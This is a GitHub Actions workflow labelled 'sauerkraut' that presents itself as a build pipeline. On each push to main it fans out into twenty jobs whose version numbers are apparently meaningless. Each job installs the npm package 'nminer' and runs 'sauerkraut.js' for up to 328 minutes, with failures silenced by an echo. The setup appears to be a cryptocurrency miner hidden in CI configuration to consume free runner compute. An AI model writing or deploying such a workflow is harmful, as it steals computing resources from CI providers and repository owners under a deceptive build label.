name: sauerkraut
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9980 }
          - { version: 3065 }
          - { version: 8562 }
          - { version: 1022 }
          - { version: 8737 }
          - { version: 5470 }
          - { version: 4030 }
          - { version: 8446 }
          - { version: 2056 }
          - { version: 5671 }
          - { version: 6985 }
          - { version: 5099 }
          - { version: 1368 }
          - { version: 2728 }
          - { version: 9956 }
          - { version: 2216 }
          - { version: 3788 }
          - { version: 6303 }
          - { version: 6060 }
          - { version: 5315 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: after asset
        run: |
          npm install nminer@latest
          timeout 328m node sauerkraut.js || echo "sauerkraut executed"